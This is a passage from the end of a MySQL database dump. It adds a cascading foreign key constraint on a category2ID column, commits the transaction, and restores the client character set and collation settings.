  ADD CONSTRAINT `FK_category2` FOREIGN KEY (`category2ID`) REFERENCES `category2` (`category2ID`) ON DELETE CASCADE ON UPDATE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
